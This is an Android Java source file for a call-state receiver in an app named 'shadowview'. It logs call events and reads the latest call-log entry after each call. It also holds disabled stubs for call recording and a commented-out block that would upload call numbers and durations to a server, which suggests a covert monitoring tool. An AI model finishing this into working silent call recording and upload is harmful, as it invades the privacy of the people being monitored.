package com.shadiz.usergin.shadowview.receiver;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;

import com.shadiz.usergin.shadowview.utils.Constants;
import com.shadiz.usergin.shadowview.utils.Logger;
import com.shadiz.usergin.shadowview.utils.Preferences;
import com.shadiz.usergin.shadowview.utils.WorkTimeDefiner;

import java.util.concurrent.TimeUnit;

import javax.inject.Inject;

/**
 * Created by oldman on 31.10.16.
 */

public class CallReceiver extends BroadcastReceiver {
    @Inject
    Context context;
    @Inject
    Preferences preferences;
    private static String LOG_TAG = CallReceiver.class.getSimpleName().toString();
    private static int osCheck = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        Logger.doLog(LOG_TAG, "intent: " + intent.getAction() + " " + intent.getExtras(),
                "intent: " + intent.getAction() + " " + intent.getExtras());

        if (WorkTimeDefiner.isDoWork() || preferences.getSms() != 0)
            return;

        Bundle bundle = intent.getExtras();
        String callingSIM = String.valueOf(bundle.getInt("simId", -1));
        if (callingSIM == "0") {
            // Incoming call from SIM1
            Logger.doLog(LOG_TAG, "sim1", "sim1");
        } else if (callingSIM == "1") {
            // Incoming call from SIM2
            Logger.doLog(LOG_TAG, "sim2", "sim2");
        }
        if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
            // получаем исходящий номер
            Logger.doLog(LOG_TAG, "android.intent.action.NEW_OUTGOING_CALL ",
                    "android.intent.action.NEW_OUTGOING_CALL");

        } else if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
            String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            Logger.doLog(LOG_TAG, "android.intent.action.PHONE_STATE ", "android.intent.action.PHONE_STATE");

            if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                // телефон звонит, получаем входящий номер
                Logger.doLog(LOG_TAG, "EXTRA_STATE_RINGING ", "EXTRA_STATE_RINGING - ");

            } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                Logger.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ", "TelephonyManager.EXTRA_STATE_OFFHOOK");

                String osVersion = android.os.Build.VERSION.RELEASE;
                Logger.doLog(LOG_TAG, "android version: " + osVersion);
                if (osVersion.startsWith("5")) {
                    Logger.doLog(LOG_TAG, "osCheck = " + osCheck);
                    if (osCheck == 1) {
                        setRecord();
                        osCheck = 0;
                    } else {
                        osCheck++;
                    }
                } else {
                    setRecord();
                }

                // телефон находится в режиме звонка (набор номера / разговор)
            } else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                // телефон находится в ждущем режиме (событие наступает по
                // окончании разговора,
                // когда уже знаем номер и факт звонка
                Logger.doLog(LOG_TAG, "EXTRA_STATE_IDLE ", "EXTRA_STATE_IDLE ");

                String osVersion = android.os.Build.VERSION.RELEASE;
                if (osVersion.startsWith("5")) {
                    Logger.doLog(LOG_TAG, "osCheck = " + osCheck);
                    if (osCheck == 1) {
                        stopRecord();
                        osCheck = 0;
                    } else {
                        osCheck++;
                    }
                } else {
                    stopRecord();
                }

                // stopRecord();
                try {
                    // TimeUnit.SECONDS.sleep(1);
                    TimeUnit.MILLISECONDS.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                getCallDetails();
            }
        }
    }

    private void setRecord() {
        Logger.doLog(LOG_TAG, "setRecord", "setRecord");
        // if (AppSettings.getSetting(AppConstants.RECORD_CALL, mContext) == 1)

        // RecordAudio.startCallRec(-1, MediaRecorder.AudioSource.VOICE_CALL,
        // mContext);
    }

    private void stopRecord() {
        Logger.doLog(LOG_TAG, "stopRecord", "stopRecord");
        // RecordAudioV2.executeStopRecording(SOURCE_RECORD, mContext);
        // RecordAudio.stop();
    }

    private void getCallDetails() {


        Cursor managedCursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);

        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        managedCursor.moveToLast();
        String phNumber = managedCursor.getString(number);
        String callType = managedCursor.getString(type);
        String callDuration = managedCursor.getString(duration);
        int callTypeStr = -1;

        int dircode = Integer.parseInt(callType);

        switch (dircode) {
            case CallLog.Calls.OUTGOING_TYPE:
                callTypeStr = Constants.TYPE_OUTGOING_CALL_REQUEST;
                break;

            case CallLog.Calls.INCOMING_TYPE:
                callTypeStr = Constants.TYPE_INCOMING_CALL_REQUEST;
                break;

            case CallLog.Calls.MISSED_TYPE:
                callTypeStr = Constants.TYPE_MISSED_CALL_REQUEST;
                break;
        }

        managedCursor.close();
//        Map<String, Object> call = new HashMap<String, Object>();
//        Map<String, String> info = new HashMap<String, String>();
//        call.put("type", callTypeStr);
//        call.put("time", ConvertDate.logTime());
//        info.put("number", phNumber);
//        info.put("duration", callDuration);
//        call.put("info", info);
//
//        RequestList.sendDataRequest(call, null, mContext);
    }
}